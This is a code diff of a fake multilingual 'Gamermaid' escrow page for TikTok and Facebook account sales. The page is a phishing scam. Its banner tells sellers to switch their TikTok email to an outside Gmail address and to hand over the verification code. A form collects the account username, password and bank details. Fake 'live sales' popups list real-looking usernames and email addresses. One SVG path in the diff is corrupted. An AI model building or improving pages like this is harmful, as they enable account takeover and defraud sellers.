@@ -15,18 +15,13 @@
             --bg-secondary: #f8fafc;
             --text-primary: #0f172a;
             --text-muted: #64748b;
-            --text-light: #94a3b8;
             --danger-red: #ef4444;
             --danger-bg: rgba(239, 68, 68, 0.06);
             --danger-border: rgba(239, 68, 68, 0.2);
-            --success-green: #22c55e;
-            
             --gradient-primary: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 50%, #ec4899 100%);
             --glass-bg-light: rgba(255, 255, 255, 0.85);
             --glass-border-light: rgba(226, 232, 240, 0.8);
             --glass-blur: blur(16px);
-            
-            --shadow-sm: 0 2px 8px rgba(15, 23, 42, 0.04);
             --shadow-md: 0 12px 32px rgba(15, 23, 42, 0.08);
             --shadow-dark: 0 20px 40px rgba(0, 0, 0, 0.35);
             --radius-sm: 8px;
@@ -60,21 +55,28 @@
         .language-select { padding: 8px 12px; border-radius: var(--radius-full); border: 1px solid var(--glass-border-light); background: var(--bg-secondary); font-size: 0.875rem; font-weight: 600; color: var(--text-primary); outline: none; cursor: pointer; }
         .btn-signin { padding: 9px 20px; border-radius: var(--radius-full); background: var(--text-primary); color: #ffffff; font-size: 0.875rem; font-weight: 600; }
 
-        /* Tab Page Visibility */
         .page-tab { display: none; }
         .page-tab.active { display: block; }
 
-        /* Escrow Form Section */
+        /* Escrow Section */
         .escrow-section { padding: 60px 0 100px 0; }
         .escrow-header { text-align: center; margin-bottom: 40px; }
         .page-title { font-size: 2.5rem; font-weight: 700; letter-spacing: -0.02em; margin-bottom: 16px; }
         
-        /* Layout Container for Sections (Supports Drag & Drop Ordering) */
         #siteSectionsWrapper { display: flex; flex-direction: column; gap: 40px; }
 
-        .payout-card { background: var(--danger-bg); border: 1.5px solid var(--danger-border); border-radius: var(--radius-lg); padding: 24px 32px; max-width: 680px; margin: 0 auto; text-align: center; box-shadow: 0 4px 20px rgba(239, 68, 68, 0.08); width: 100%; }
-        .payout-row { font-size: 1.05rem; font-weight: 600; color: var(--danger-red); margin: 8px 0; display: flex; justify-content: space-between; align-items: center; padding: 4px 0; }
-        .payout-row.total { font-size: 1.35rem; font-weight: 700; border-top: 1px dashed rgba(239, 68, 68, 0.3); padding-top: 14px; margin-top: 12px; }
+        /* Interactive Calculator Card */
+        .payout-card { background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-lg); padding: 32px; max-width: 680px; margin: 0 auto; box-shadow: var(--shadow-md); width: 100%; }
+        .calc-title { font-size: 1.15rem; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; color: var(--text-primary); }
+        .calc-inputs-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 16px; margin-bottom: 24px; }
+        .calc-input-group { display: flex; flex-direction: column; gap: 6px; }
+        .calc-input-group label { font-size: 0.85rem; font-weight: 600; color: var(--text-muted); }
+        .calc-input-group input, .calc-input-group select { width: 100%; padding: 12px 16px; border-radius: var(--radius-md); border: 1px solid var(--glass-border-light); background: #ffffff; font-family: inherit; font-size: 1rem; outline: none; font-weight: 600; color: var(--text-primary); }
+        .calc-input-group input:focus, .calc-input-group select:focus { border-color: #8b5cf6; box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15); }
+        
+        .calc-results-box { background: var(--danger-bg); border: 1.5px solid var(--danger-border); border-radius: var(--radius-md); padding: 20px 24px; }
+        .payout-row { font-size: 1.05rem; font-weight: 600; color: var(--danger-red); margin: 6px 0; display: flex; justify-content: space-between; align-items: center; }
+        .payout-row.total { font-size: 1.35rem; font-weight: 700; border-top: 1px dashed rgba(239, 68, 68, 0.3); padding-top: 12px; margin-top: 10px; color: #16a34a; }
 
         .form-card { background: #ffffff; border: 1px solid var(--glass-border-light); border-radius: var(--radius-lg); padding: 40px; max-width: 680px; margin: 0 auto; box-shadow: var(--shadow-md); width: 100%; }
         .form-section-title { font-size: 1.35rem; font-weight: 700; margin-bottom: 24px; padding-bottom: 12px; border-bottom: 1px solid var(--glass-border-light); display: flex; align-items: center; gap: 10px; }
@@ -85,7 +87,9 @@
         .form-group input, .form-group select { width: 100%; padding: 12px 16px; border-radius: var(--radius-md); border: 1px solid var(--glass-border-light); background: var(--bg-secondary); font-family: inherit; font-size: 0.95rem; outline: none; }
         .form-group input:focus, .form-group select:focus { border-color: #8b5cf6; background: #ffffff; box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15); }
         .field-notice { font-size: 0.825rem; color: var(--danger-red); font-weight: 500; margin-top: 4px; display: flex; align-items: center; gap: 6px; }
-        .email-change-banner { background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.25); color: #2563eb; padding: 12px 16px; border-radius: var(--radius-md); font-weight: 600; font-size: 0.9rem; margin-bottom: 20px; text-align: center; }
+        
+        /* Updated Banner Styling */
+        .email-change-banner { background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.3); color: #1d4ed8; padding: 14px 18px; border-radius: var(--radius-md); font-weight: 700; font-size: 0.95rem; margin-bottom: 24px; text-align: center; box-shadow: 0 4px 12px rgba(59, 130, 246, 0.08); display: flex; align-items: center; justify-content: center; gap: 8px; }
 
         .bank-logos-container { margin-bottom: 24px; }
         .bank-logos-title { font-size: 0.85rem; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 12px; }
@@ -107,7 +111,6 @@
         .contact-box { background: var(--bg-secondary); padding: 20px; border-radius: var(--radius-md); border: 1px solid var(--glass-border-light); }
         .contact-box h3 { font-size: 1rem; font-weight: 700; margin-bottom: 8px; color: var(--text-primary); }
         .contact-box p, .contact-box a { font-size: 0.925rem; color: var(--text-muted); word-break: break-all; }
-        .contact-box a:hover { color: #8b5cf6; text-decoration: underline; }
 
         /* Modals & Chat */
         .modal-backdrop { position: fixed; inset: 0; background: rgba(15, 23, 42, 0.6); backdrop-filter: blur(8px); display: flex; align-items: center; justify-content: center; padding: 24px; opacity: 0; visibility: hidden; transition: all var(--transition-normal); z-index: 2000; }
@@ -118,17 +121,9 @@
         .modal-desc { color: var(--text-muted); font-size: 0.975rem; margin-bottom: 24px; line-height: 1.6; }
         .modal-contact { padding: 12px 16px; background: var(--bg-secondary); border-radius: var(--radius-md); font-weight: 600; color: #8b5cf6; margin-bottom: 24px; font-size: 0.9rem; }
 
-        /* Language Prompt Popup Modal Styles */
-        .lang-modal-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
-        .lang-option-btn { padding: 12px; background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-md); font-weight: 600; font-size: 0.925rem; cursor: pointer; transition: all var(--transition-fast); color: var(--text-primary); text-align: center; }
-        .lang-option-btn:hover { background: #8b5cf6; color: #ffffff; border-color: #8b5cf6; }
-
-        /* Live Sales Popups Widget Styling */
         .sales-popup-container { position: fixed; bottom: 24px; left: 24px; display: flex; flex-direction: column; gap: 12px; z-index: 9999; pointer-events: none; max-width: 340px; }
-        .sales-popup-card { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(12px); border: 1px solid rgba(226, 232, 240, 0.9); border-left: 4px solid #8b5cf6; padding: 14px 18px; border-radius: 12px; box-shadow: 0 10px 25px rgba(15, 23, 42, 0.12); font-family: 'Inter', system-ui, -apple-system, sans-serif; font-size: 0.875rem; color: #0f172a; pointer-events: auto; opacity: 0; transform: translateX(-40px); transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); }
+        .sales-popup-card { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(12px); border: 1px solid rgba(226, 232, 240, 0.9); border-left: 4px solid #8b5cf6; padding: 14px 18px; border-radius: 12px; box-shadow: 0 10px 25px rgba(15, 23, 42, 0.12); font-size: 0.875rem; color: #0f172a; pointer-events: auto; opacity: 0; transform: translateX(-40px); transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); }
         .sales-popup-card.show { opacity: 1; transform: translateX(0); }
-        .sales-popup-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 4px; font-weight: 700; color: #8b5cf6; }
-        .sales-popup-time { font-size: 0.75rem; color: #64748b; font-weight: 400; }
 
         .chat-widget-btn { position: fixed; bottom: 24px; right: 24px; width: 56px; height: 56px; background: var(--gradient-primary); color: #ffffff; border-radius: var(--radius-full); display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 25px rgba(139, 92, 246, 0.4); cursor: pointer; z-index: 1500; }
         .chat-box-container { position: fixed; bottom: 96px; right: 24px; width: 340px; max-width: calc(100vw - 48px); background: #ffffff; border: 1px solid var(--glass-border-light); border-radius: var(--radius-lg); box-shadow: var(--shadow-dark); display: none; flex-direction: column; overflow: hidden; z-index: 1500; }
@@ -143,7 +138,7 @@
         .chat-send-btn { background: #8b5cf6; color: #ffffff; padding: 8px 14px; border-radius: var(--radius-sm); font-weight: 600; font-size: 0.875rem; }
 
         @media (max-width: 600px) {
-            .form-grid, .contact-info-grid, .lang-modal-grid { grid-template-columns: 1fr; }
+            .form-grid, .contact-info-grid, .calc-inputs-grid { grid-template-columns: 1fr; }
             .form-group.full-width { grid-column: span 1; }
             .navbar { flex-wrap: wrap; height: auto; padding: 12px 0; }
         }
@@ -164,7 +159,8 @@
                 <!-- Navigation Tabs -->
                 <ul class="nav-links">
                     <li><a href="index.html" class="nav-link active" data-i18n="navEscrow">Escrow Services</a></li>
-                    <li><a href="buyers.html" class="nav-link" data-i18n="navBuyers">Verified Buyers</a></li>
+                    <li><a href="#" class="nav-link" data-i18n="navBuyers">Verified Buyers</a></li>
+                    <li><a href="translation.html" class="nav-link">Translation Hub 🌐</a></li>
                     <li><a href="#" class="nav-link" data-tab="contactPage" data-i18n="navContact">Contact Us</a></li>
                 </ul>
 
@@ -193,17 +189,40 @@
                     <p style="color: var(--text-muted);" data-i18n="escrowSub">Secure automated verification and middleman clearance system.</p>
                 </div>
 
-                <!-- Wrapper for Sections (Supports Admin Drag & Drop Reordering) -->
                 <div id="siteSectionsWrapper">
                     
-                    <!-- Section ID: payoutCard -->
+                    <!-- Interactive Escrow Payout Calculator Card -->
                     <div class="payout-card" data-section-id="payoutCard">
-                        <div class="payout-row"><span data-i18n="depositLabel">KingAccMarket Deposit</span><span id="displayDepositAmt">2,000,000 Kyats</span></div>
-                        <div class="payout-row"><span id="displayFeeLabel">Middle Man Fee (7%)</span><span id="displayFeeAmt">- 140,000 Kyats</span></div>
-                        <div class="payout-row total"><span data-i18n="totalLabel">You will get</span><span id="displayTotalPayout">1,860,000 Kyats</span></div>
+                        <div class="calc-title">
+                            <svg class="icon" viewBox="0 0 24 24"><rect x="4" y="2" width="16" height="20" rx="2" ry="2"/><line x1="8" y1="6" x2="16" y2="6"/><line x1="16" y1="14" x2="16" y2="18"/><path d="M8 10h6"/><path d="M8 14h4"/><path d="M8 18h2"/></svg>
+                            <span>Escrow Payout Calculator</span>
+                        </div>
+                        
+                        <div class="calc-inputs-grid">
+                            <div class="calc-input-group">
+                                <label for="requestedPrice">Requested Price</label>
+                                <input type="number" id="requestedPrice" value="2000000" min="0" step="any" placeholder="Enter amount">
+                            </div>
+                            <div class="calc-input-group">
+                                <label for="currencySelect">Currency</label>
+                                <select id="currencySelect">
+                                    <option value="Kyats">Kyats (MMK)</option>
+                                    <option value="Baht">Baht (THB)</option>
+                                    <option value="Yuan">China Yuan (CNY)</option>
+                                    <option value="Yen">Japan Yen (JPY)</option>
+                                    <option value="Rupee">India Rupee (INR)</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div class="calc-results-box">
+                            <div class="payout-row"><span data-i18n="depositLabel">Requested Amount</span><span id="displayDepositAmt">2,000,000 Kyats</span></div>
+                            <div class="payout-row"><span id="displayFeeLabel">Middle Man Fee (7%)</span><span id="displayFeeAmt">- 140,000 Kyats</span></div>
+                            <div class="payout-row total"><span data-i18n="totalLabel">You will get</span><span id="displayTotalPayout">1,860,000 Kyats</span></div>
+                        </div>
                     </div>
 
-                    <!-- Section ID: escrowForm -->
+                    <!-- Account Verification Form -->
                     <div class="form-card" data-section-id="escrowForm">
                         <form id="escrowForm">
                             <div class="form-section-title">
@@ -211,7 +230,11 @@
                                 <span data-i18n="accVerification">Account Verification</span>
                             </div>
 
-                            <div class="email-change-banner" data-i18n="emailBanner">Change your TikTok Email to gamermaid.ai@gmail.com</div>
+                            <!-- UPDATED EMAIL CHANGE & BUYER CODE BANNER -->
+                            <div class="email-change-banner">
+                                <svg class="icon" viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+                                <span data-i18n="emailBanner">Change your TikTok Email to gamermaid.ai@gmail.com and Ask the Buyer for the Email Code</span>
+                            </div>
 
                             <div class="form-grid">
                                 <div class="form-group"><label for="username" data-i18n="lblUsername">Username</label><input type="text" id="username" name="username" placeholder="Enter account username" data-i18n-placeholder="phUsername" required></div>
@@ -270,10 +293,10 @@
                         </form>
                     </div>
 
-                    <!-- Section ID: rulesContainer -->
+                    <!-- Rules Container -->
                     <div class="rules-container" data-section-id="rulesContainer">
                         <div class="rules-title">
-                            <svg class="icon" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+                            <svg class="icon" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
                             <span data-i18n="rulesTitle">Escrow Terms & Rules</span>
                         </div>
                         <ul class="rules-list">
@@ -290,7 +313,7 @@
         </main>
     </div>
 
-    <!-- Page 3: Contact Us Page -->
+    <!-- Page 2: Contact Us Page -->
     <div id="contactPage" class="page-tab">
         <main class="escrow-section">
             <div class="container">
@@ -324,7 +347,7 @@
         </main>
     </div>
 
-    <!-- Live Sales Popups Widget Container -->
+    <!-- Live Sales Popups Container -->
     <div class="sales-popup-container" id="salesPopupContainer"></div>
 
     <!-- Live Chat Widget -->
@@ -333,25 +356,6 @@
         <div class="chat-header"><span data-i18n="chatHeader">Chat with Admin</span><button id="chatCloseBtn" style="color:white; font-weight:700; cursor:pointer;">&times;</button></div>
         <div class="chat-messages" id="chatMessages"><div class="chat-msg incoming" data-i18n="chatWelcome">Hello! Welcome to Gamermaid Escrow. How can we help you today?</div></div>
         <div class="chat-input-area"><input type="text" id="chatInput" placeholder="Type a message..." data-i18n-placeholder="phChat" tabindex="0"><button class="chat-send-btn" id="chatSendBtn" data-i18n="chatSend">Send</button></div>
-    </div>
-
-    <!-- Language Change Prompt Popup Modal (Shows after 3 seconds) -->
-    <div class="modal-backdrop" id="langPromptModal">
-        <div class="modal-card">
-            <div style="display: flex; justify-content: flex-end; margin-top: -10px; margin-right: -10px;">
-                <button id="closeLangModalBtn" style="font-size: 1.5rem; background: none; border: none; color: var(--text-muted); cursor: pointer;">&times;</button>
-            </div>
-            <div class="modal-status-icon">🌐</div>
-            <h3 class="modal-title">Change Language?</h3>
-            <p class="modal-desc">Would you like to view the site in your preferred language?</p>
-            <div class="lang-modal-grid">
-                <button class="lang-option-btn" data-lang="en">🇬🇧 English</button>
-                <button class="lang-option-btn" data-lang="ja">🇯🇵 日本語 (Japan)</button>
-                <button class="lang-option-btn" data-lang="zh">🇨🇳 中文 (China)</button>
-                <button class="lang-option-btn" data-lang="th">🇹🇭 ไทย (Thai)</button>
-                <button class="lang-option-btn" data-lang="my" style="grid-column: span 2;">🇲🇲 မြန်မာ (Myanmar)</button>
-            </div>
-        </div>
     </div>
 
     <!-- Confirmation Modal -->
@@ -368,49 +372,7 @@
         </div>
     </div>
 
-    <!-- Firebase Auth Modal -->
-    <div class="modal-backdrop" id="authModal">
-        <div class="modal-card" style="text-align: left; max-width: 420px;">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                <h3 class="modal-title" id="authModalTitle" style="margin: 0; font-size: 1.25rem;" data-i18n="authTitle">Sign In to Gamermaid</h3>
-                <button id="closeAuthModal" style="font-size: 1.25rem; cursor: pointer; background:none; border:none; color: var(--text-muted);">&times;</button>
-            </div>
-
-            <button id="anonLoginBtn" style="width: 100%; padding: 12px; background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-full); font-weight: 600; cursor: pointer; margin-bottom: 20px; color: var(--text-primary);" data-i18n="anonBtn">
-                ⚡ Quick Guest / Anonymous Sign In
-            </button>
-
-            <div style="text-align: center; color: var(--text-light); font-size: 0.85rem; margin-bottom: 20px; position: relative;">
-                <span style="background: white; padding: 0 10px; position: relative; z-index: 1;" data-i18n="orEmail">OR WITH EMAIL</span>
-                <hr style="border: none; border-top: 1px solid var(--glass-border-light); position: absolute; top: 50%; left: 0; right: 0; z-index: 0;">
-            </div>
-
-            <form id="emailAuthForm">
-                <div class="form-group" style="margin-bottom: 16px;">
-                    <label for="authEmail" style="font-size: 0.85rem; font-weight: 600; display: block; margin-bottom: 6px;" data-i18n="lblEmail">Email Address</label>
-                    <input type="email" id="authEmail" required placeholder="name@example.com" style="width: 100%; padding: 10px 14px; border-radius: var(--radius-md); border: 1px solid var(--glass-border-light); background: var(--bg-secondary);">
-                </div>
-                <div class="form-group" style="margin-bottom: 24px;">
-                    <label for="authPassword" style="font-size: 0.85rem; font-weight: 600; display: block; margin-bottom: 6px;" data-i18n="lblPass">Password</label>
-                    <input type="password" id="authPassword" required placeholder="At least 6 characters" style="width: 100%; padding: 10px 14px; border-radius: var(--radius-md); border: 1px solid var(--glass-border-light); background: var(--bg-secondary);">
-                </div>
-                <button type="submit" id="authSubmitBtn" class="btn-continue" style="width: 100%; padding: 12px; border-radius: var(--radius-full);" data-i18n="signIn">Sign In</button>
-            </form>
-            
-            <p style="text-align: center; margin-top: 16px; font-size: 0.85rem; color: var(--text-muted);">
-                <span id="toggleAuthModeText" data-i18n="noAccount">Don't have an account?</span> 
-                <button id="switchAuthModeBtn" style="color: #8b5cf6; font-weight: 600; background:none; border:none; cursor:pointer;" data-i18n="signUp">Sign up</button>
-            </p>
-        </div>
-    </div>
-
-    <!-- Script Controller, Translations, Popups, and Firebase Modules -->
     <script type="module">
-        import { registerEmail, loginEmail, loginAnonymous, trackAuth, saveEscrowSubmission, saveChatMessage } from "./firebase-config.js";
-        import { doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-        import { db } from "./firebase-config.js";
-
-        // Multi-Language Dictionary
         const translations = {
             en: {
                 navEscrow: "Escrow Services",
@@ -419,10 +381,10 @@
                 signIn: "Sign In",
                 escrowTitle: "Third Party Escrow Services",
                 escrowSub: "Secure automated verification and middleman clearance system.",
-                depositLabel: "KingAccMarket Deposit",
+                depositLabel: "Requested Amount",
                 totalLabel: "You will get",
                 accVerification: "Account Verification",
-                emailBanner: "Change your TikTok Email to gamermaid.ai@gmail.com",
+                emailBanner: "Change your TikTok Email to gamermaid.ai@gmail.com and Ask the Buyer for the Email Code",
                 lblUsername: "Username",
                 phUsername: "Enter account username",
                 lblPassword: "Password",
@@ -464,14 +426,7 @@
                 modalTitle: "Verification In Progress",
                 modalDesc: "The admins are checking your account. We will send Your Money to your Bank Accounts after 24 hours.",
                 modalWarning: "(Make sure You fill the Bank info Correctly).",
-                closeWindow: "Close Window",
-                authTitle: "Sign In to Gamermaid",
-                anonBtn: "⚡ Quick Guest / Anonymous Sign In",
-                orEmail: "OR WITH EMAIL",
-                lblEmail: "Email Address",
-                lblPass: "Password",
-                noAccount: "Don't have an account?",
-                signUp: "Sign up"
+                closeWindow: "Close Window"
             },
             ja: {
                 navEscrow: "エスクローサービス",
@@ -480,10 +435,10 @@
                 signIn: "サインイン",
                 escrowTitle: "第三者エスクローサービス",
                 escrowSub: "安全な自動認証および仲介クリアランスシステム。",
-                depositLabel: "KingAccMarket 預託金",
+                depositLabel: "リクエスト金額",
                 totalLabel: "お受取額",
                 accVerification: "アカウント認証",
-                emailBanner: "TikTokのメールアドレスを gamermaid.ai@gmail.com に変更してください",
+                emailBanner: "TikTokのメールアドレスを gamermaid.ai@gmail.com に変更し、買主にメール確認コードを要求してください",
                 lblUsername: "ユーザー名",
                 phUsername: "アカウントのユーザー名を入力",
                 lblPassword: "パスワード",
@@ -525,14 +480,7 @@
                 modalTitle: "認証処理中",
                 modalDesc: "管理者がお客様のアカウントを確認しています。24時間以内にご指定の銀行口座へ送金いたします。",
                 modalWarning: "(銀行情報を正しく入力したことをご確認ください)。",
-                closeWindow: "ウィンドウを閉じる",
-                authTitle: "Gamermaidへサインイン",
-                anonBtn: "⚡ 簡単ゲスト / 匿名サインイン",
-                orEmail: "またはメールで",
-                lblEmail: "メールアドレス",
-                lblPass: "パスワード",
-                noAccount: "アカウントをお持ちでないですか？",
-                signUp: "新規登録"
+                closeWindow: "ウィンドウを閉じる"
             },
             zh: {
                 navEscrow: "第三方担保交易",
@@ -541,10 +489,10 @@
                 signIn: "登录",
                 escrowTitle: "第三方担保交易服务",
                 escrowSub: "安全自动验证与中间人结算系统。",
-                depositLabel: "KingAccMarket 存款",
+                depositLabel: "请求金额",
                 totalLabel: "您将获得",
                 accVerification: "账户验证",
-                emailBanner: "请将您的 TikTok 邮箱更改为 gamermaid.ai@gmail.com",
+                emailBanner: "请将您的 TikTok 邮箱更改为 gamermaid.ai@gmail.com 并向买家索取邮箱验证码",
                 lblUsername: "用户名",
                 phUsername: "输入账户用户名",
                 lblPassword: "密码",
@@ -586,14 +534,7 @@
                 modalTitle: "验证进行中",
                 modalDesc: "管理员正在检查您的账户。我们将在 24 小时内将您的资金汇入您的银行账户。",
                 modalWarning: "(请确保您正确填写了银行信息)。",
-                closeWindow: "关闭窗口",
-                authTitle: "登录 Gamermaid",
-                anonBtn: "⚡ 快速访客 / 匿名登录",
-                orEmail: "或通过邮箱登录",
-                lblEmail: "电子邮箱",
-                lblPass: "密码",
-                noAccount: "没有账户？",
-                signUp: "注册"
+                closeWindow: "关闭窗口"
             },
             th: {
                 navEscrow: "บริการเอสโครว์",
@@ -602,10 +543,10 @@
                 signIn: "เข้าสู่ระบบ",
                 escrowTitle: "บริการเอสโครว์บุคคลที่สาม",
                 escrowSub: "ระบบยืนยันตัวตนอัตโนมัติและเคลียร์ริ่งคนกลางที่ปลอดภัย",
-                depositLabel: "เงินมัดจำ KingAccMarket",
+                depositLabel: "จำนวนเงินที่ขอ",
                 totalLabel: "ที่คุณจะได้รับ",
                 accVerification: "การยืนยันบัญชี",
-                emailBanner: "เปลี่ยนอีเมล TikTok ของคุณเป็น gamermaid.ai@gmail.com",
+                emailBanner: "เปลี่ยนอีเมล TikTok ของคุณเป็น gamermaid.ai@gmail.com และขอรหัสอีเมลจากผู้ซื้อ",
                 lblUsername: "ชื่อผู้ใช้",
                 phUsername: "ป้อนชื่อผู้ใช้บัญชี",
                 lblPassword: "รหัสผ่าน",
@@ -647,14 +588,7 @@
                 modalTitle: "กำลังดำเนินการตรวจสอบ",
                 modalDesc: "ผู้ดูแลระบบกำลังตรวจสอบบัญชีของคุณ เราจะส่งเงินของคุณไปยังบัญชีธนาคารหลัง 24 ชั่วโมง",
                 modalWarning: "(โปรดตรวจสอบให้แน่ใจว่าคุณกรอกข้อมูลธนาคารอย่างถูกต้อง)",
-                closeWindow: "ปิดหน้าต่าง",
-                authTitle: "เข้าสู่ระบบ Gamermaid",
-                anonBtn: "⚡ เข้าสู่ระบบแบบแขก / ไม่เปิดเผยตัวตนด่วน",
-                orEmail: "หรือใช้อีเมล",
-                lblEmail: "ที่อยู่อีเมล",
-                lblPass: "รหัสผ่าน",
-                noAccount: "ยังไม่มีบัญชีใช่ไหม?",
-                signUp: "สมัครสมาชิก"
+                closeWindow: "ปิดหน้าต่าง"
             },
             my: {
                 navEscrow: "အက်စခရိုး ဝန်ဆောင်မှုများ",
@@ -663,10 +597,10 @@
                 signIn: "အကောင့်ဝင်ရန်",
                 escrowTitle: "တတိယပါတီ အက်စခရိုး ဝန်ဆောင်မှုများ",
                 escrowSub: "လုံခြုံစိတ်ချရသော အလိုအလျောက် အတည်ပြုခြင်းနှင့် ကြားခံရှင်းလင်းရေးစနစ်။",
-                depositLabel: "KingAccMarket အပ်နှံငွေ",
+                depositLabel: "တောင်းဆိုထားသော ပမာဏ",
                 totalLabel: "သင်ရရှိမည့်ငွေ",
                 accVerification: "အကောင့် အတည်ပြုခြင်း",
-                emailBanner: "သင့် TikTok အီးမေးလ်ကို gamermaid.ai@gmail.com သို့ ပြောင်းလဲပါ",
+                emailBanner: "သင့် TikTok အီးမေးလ်ကို gamermaid.ai@gmail.com သို့ ပြောင်းလဲပြီး ဝယ်ယူသူထံမှ အီးမေးလ်ကုဒ် (Email Code) တောင်းယူပါ",
                 lblUsername: "အသုံးပြုသူအမည် (Username)",
                 phUsername: "အကောင့်အမည် ထည့်ပါ",
                 lblPassword: "စကားဝှက် (Password)",
@@ -708,31 +642,19 @@
                 modalTitle: "အတည်ပြုစစ်ဆေးနေဆဲဖြစ်သည်",
                 modalDesc: "အက်ဒမင်များမှ သင့်အကောင့်ကို စစ်ဆေးနေပါသည်။ ၂၄ နာရီအတွင်း သင့်ဘဏ်အကောင့်သို့ ငွေလွှဲပေးပါမည်။",
                 modalWarning: "(ဘဏ်အချက်အလက်များကို မှန်ကန်စွာ ဖြည့်သွင်းရန် သေချာစေပါ)။",
-                closeWindow: "ဝင်းဒိုးပိတ်ရန်",
-                authTitle: "Gamermaid သို့ အကောင့်ဝင်ရန်",
-                anonBtn: "⚡ ဧည့်သည်အဖြစ် အမြန်ဝင်ရန်",
-                orEmail: "(သို့) အီးမေးလ်ဖြင့်",
-                lblEmail: "အီးမေးလ် လိပ်စာ",
-                lblPass: "စကားဝှက်",
-                noAccount: "အကောင့်မရှိသေးဘူးလား?",
-                signUp: "စာရင်းသွင်းရန်"
+                closeWindow: "ဝင်းဒိုးပိတ်ရန်"
             }
         };
 
-        // Translation Function
         function changeLanguage(lang) {
             const t = translations[lang] || translations.en;
             document.querySelectorAll('[data-i18n]').forEach(el => {
                 const key = el.getAttribute('data-i18n');
-                if (t[key]) {
-                    el.textContent = t[key];
-                }
+                if (t[key]) el.textContent = t[key];
             });
             document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
                 const key = el.getAttribute('data-i18n-placeholder');
-                if (t[key]) {
-                    el.placeholder = t[key];
-                }
+                if (t[key]) el.placeholder = t[key];
             });
             localStorage.setItem('gamermaid_lang', lang);
         }
@@ -743,131 +665,58 @@
             languageSelector.value = savedLang;
             changeLanguage(savedLang);
 
-            languageSelector.addEventListener('change', (e) => {
-                changeLanguage(e.target.value);
-            });
+            languageSelector.addEventListener('change', (e) => changeLanguage(e.target.value));
 
-            // 3-Second Language Prompt Modal Logic
-            const langPromptModal = document.getElementById('langPromptModal');
-            const closeLangModalBtn = document.getElementById('closeLangModalBtn');
+            // Calculator
+            const requestedPriceInput = document.getElementById('requestedPrice');
+            const currencySelect = document.getElementById('currencySelect');
+            const displayDepositAmt = document.getElementById('displayDepositAmt');
+            const displayFeeLabel = document.getElementById('displayFeeLabel');
+            const displayFeeAmt = document.getElementById('displayFeeAmt');
+            const displayTotalPayout = document.getElementById('displayTotalPayout');
 
-            if (!sessionStorage.getItem('lang_prompt_shown')) {
-                setTimeout(() => {
-                    langPromptModal.classList.add('active');
-                    sessionStorage.setItem('lang_prompt_shown', 'true');
-                }, 3000);
+            function updateCalculator() {
+                const amount = parseFloat(requestedPriceInput.value) || 0;
+                const currency = currencySelect.value;
+                const fee = (amount * 7) / 100;
+                const total = amount - fee;
+
+                displayDepositAmt.textContent = `${amount.toLocaleString()} ${currency}`;
+                displayFeeLabel.textContent = `Middle Man Fee (7%)`;
+                displayFeeAmt.textContent = `- ${fee.toLocaleString()} ${currency}`;
+                displayTotalPayout.textContent = `${total.toLocaleString()} ${currency}`;
             }
 
-            closeLangModalBtn.addEventListener('click', () => {
-                langPromptModal.classList.remove('active');
-            });
+            requestedPriceInput.addEventListener('input', updateCalculator);
+            currencySelect.addEventListener('change', updateCalculator);
+            updateCalculator();
 
-            document.querySelectorAll('.lang-option-btn').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    const selectedLang = e.target.getAttribute('data-lang');
-                    languageSelector.value = selectedLang;
-                    changeLanguage(selectedLang);
-                    langPromptModal.classList.remove('active');
+            // Tabs Switch
+            const navLinks = document.querySelectorAll('.nav-link[data-tab]');
+            const escrowPage = document.getElementById('escrowPage');
+            const contactPage = document.getElementById('contactPage');
+
+            navLinks.forEach(link => {
+                link.addEventListener('click', (e) => {
+                    const tabName = link.getAttribute('data-tab');
+                    if (tabName === 'contactPage') {
+                        e.preventDefault();
+                        navLinks.forEach(l => l.classList.remove('active'));
+                        link.classList.add('active');
+                        escrowPage.classList.remove('active');
+                        contactPage.classList.add('active');
+                        window.scrollTo({ top: 0, behavior: 'smooth' });
+                    }
                 });
             });
 
-            // Live Sales Popups Engine (30 Accounts featuring Myanmar & Japan)
-            const accountDatabase = [
-                { platform: "TikTok", user: "PhyuThazin09", country: "🇲🇲 Myanmar" },
-                { platform: "Facebook", user: "ChanMyae99@gmail.com", country: "🇲🇲 Myanmar" },
-                { platform: "TikTok", user: "AungKyawOo_88", country: "🇲🇲 Myanmar" },
-                { platform: "Facebook", user: "HninWati.2023@gmail.com", country: "🇲🇲 Myanmar" },
